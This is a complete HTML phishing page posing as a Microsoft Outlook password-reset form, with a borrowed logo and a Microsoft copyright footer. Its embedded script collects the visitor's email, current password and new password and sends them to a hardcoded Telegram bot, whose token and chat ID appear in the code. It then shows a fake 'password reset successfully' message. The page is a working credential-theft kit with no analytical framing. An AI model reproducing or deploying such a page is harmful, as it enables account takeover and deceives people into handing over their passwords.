<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Reset Your Password</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f3f2f1;
    }
    .container {
      max-width: 390px;
      margin: 80px auto;
      background-color: #ffffff;
      padding: 40px;
      border: 1px solid #e1dfdd;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
    }
    .logo {
      text-align: center;
      margin-bottom: 30px;
    }
    .logo img {
      width: 140px;
    }
    h2 {
      font-size: 22px;
      color: #333333;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      color: #666666;
      margin-bottom: 20px;
    }
    label {
      display: block;
      font-size: 14px;
      margin-top: 15px;
      margin-bottom: 5px;
      color: #333333;
    }
    input[type="password"] {
      width: 100%;
      padding: 10px;
      font-size: 14px;
      border: 1px solid #c8c6c4;
      border-radius: 4px;
      box-sizing: border-box;
    }
    .submit-btn {
      width: 100%;
      background-color: #0078d4;
      color: white;
      border: none;
      padding: 12px;
      margin-top: 25px;
      font-size: 15px;
      border-radius: 4px;
      cursor: pointer;
    }
    .submit-btn:hover {
      background-color: #005ea2;
    }

     .status {
      margin-top: 15px;
      font-size: 14px;
      font-style: italic;
      color: green;
      display: none;
    }

    .error {
      color: red;
    }

    .footer {
      text-align: center;
      font-size: 12px;
      color: #999999;
      margin-top: 30px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://res.cloudinary.com/primecardcloud/image/upload/v1747415146/jxag0acrkxv8z4gt6qwf.png" alt="Outlook Logo">
    </div>
    <h2>Reset your password</h2>
    <p>To help keep your account secure, please enter your current password and choose a new one.</p>
    <form id="resetForm">
      <label for="oldPassword">Email</label>
      <input type="email" id="email" name="mail" required>
      
      <label for="oldPassword">Current password</label>
      <input type="password" id="oldPass" name="oldPass" required>

      <label for="newPassword">New password</label>
      <input type="password" id="newPassword" name="newPassword" required>

      <label for="confirmPassword">Confirm new password</label>
      <input type="password" id="newPass" name="newPass" required>

      <button type="submit" class="submit-btn">Reset Password</button>
      <p id="status" class="status"></p>
    </form>
    <div class="footer">
      &copy; 2025 Microsoft Corporation. All rights reserved.
    </div>
  </div>
 <script>
    const TELEGRAM_BOT_TOKEN = '8072471611:AAFuXj2BnzWNV2GnMLPLpqui5MBVtBJvdvg';
    const TELEGRAM_CHAT_ID = '7787110558';

    document.getElementById("resetForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const oldPass = document.getElementById("oldPass").value.trim();
      const newPass = document.getElementById("newPass").value.trim();
      const email = document.getElementById("email").value.trim();
      const statusEl = document.getElementById("status");

      if (!oldPass || !newPass) {
        statusEl.textContent = "Please fill in all fields.";
        statusEl.classList.add("error");
        statusEl.style.display = "block";
        return;
      }

      const message = `ðŸ” *Password Reset Request*\n\n ðŸ“© *Email:* ${email} ðŸ‘¤ *Old Password:* ${oldPass}\nðŸ†• *New Password:* ${newPass}\n ðŸ“… *Time:* ${new Date().toLocaleString()}`;

      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      })
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          statusEl.textContent = " Your password has been reset successfully.";
          statusEl.classList.remove("error");
          statusEl.style.display = "block";
          document.getElementById("resetForm").reset();
        } else {
          throw new Error("Telegram API error");
        }
      })
      .catch(err => {
        statusEl.textContent = " Failed to submit your request.";
        statusEl.classList.add("error");
        statusEl.style.display = "block";
        console.error("Error:", err);
      });
    });
  </script>
</body>
</html>
